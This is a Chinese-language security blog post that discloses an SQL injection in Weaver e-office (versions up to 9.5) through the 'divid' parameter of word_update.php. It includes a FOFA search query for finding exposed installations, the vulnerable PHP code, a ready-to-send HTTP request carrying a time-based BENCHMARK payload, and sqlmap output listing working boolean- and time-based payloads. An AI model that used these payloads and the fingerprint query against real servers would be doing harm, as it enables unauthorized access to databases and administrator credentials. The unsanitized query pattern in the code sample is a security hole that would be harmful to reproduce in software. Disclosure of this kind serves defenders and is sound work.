---
title: "泛微e-office word_update.php sql注入漏洞"
source: https://mrxn.net/jswz/eoffice-general-system-interface-loginedit-word_update.html
asset_dir: assets/泛微e-office-word_update.php-sql注入漏洞
---

# 泛微e-office word\_update.php sql注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/14 08:29
- 914浏览
- [0评论](#comment)
- 16分钟阅读

深入探索

网络安全课程

服务器安全服务

漏洞扫描服务

---

# 漏洞简介

[泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)E-Office是一款标准化的协同 OA 办公[软件](#)，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office word\_update.php 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

代码安全审计

# 影响版本

e-office <=9.5

# fofa语句

> `app="泛微-EOffice"`

# 漏洞分析

general/system/interface/loginedit/word\_update.php 业务逻辑如下

```
<?php

include_once( "inc/conn.php" );
$id = $_REQUEST['divid'];
$wordcolor = $_REQUEST['wordcolor'];
$wordfont = $_REQUEST['wordfont'];
$content = $_REQUEST['content'];
$isshow = $_REQUEST['isshow'];
if ( $content == "" && $wordcolor )
{
    $query = "\r\n\t\tSELECT TEMPID,TAGDIV FROM index_div WHERE DIV_ID = {$id}\r\n\t\t";
    $re = exequery( $connection, $query );
    $ROW = mysql_fetch_array( $re );
    $TEMPID = $ROW['TEMPID'];
```

深入探索

漏洞扫描器

JSON处理工具

Windows安全工具

`divid` 被直接拼接进SQL语句后执行，无任何过滤校验，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
GET /general/system/interface/loginedit/word_update.php HTTP/1.1
Host: eoffice.mrxn.net:8082
Cookie: divid=1 AND 3742=BENCHMARK(4000000,MD5(0x496c624d));wordcolor=5;content=
```

[![泛微e-office word_update.php sql注入漏洞](images/img-001-39cf04dfe8e9.webp)](https://image.mrxn.net/ded6a7605aa343919f96118fdfb314e1.webp)

成功在延时 4 秒

漏洞预警服务

深入探索

安全研究工具

恶意软件分析工具

企业安全咨询

[sqlmap](https://mrxn.net/tag/sqlmap) 结果如下

```
sqlmap identified the following injection point(s) with a total of 239 HTTP(s) requests:
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: divid=(SELECT (CASE WHEN (3387=3387) THEN 1 ELSE (SELECT 9058 UNION SELECT 6601) END))&wordcolor=5&content=

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: divid=1 AND 3742=BENCHMARK(4000000,MD5(0x496c624d))&wordcolor=5&content=
---
```

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语句](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
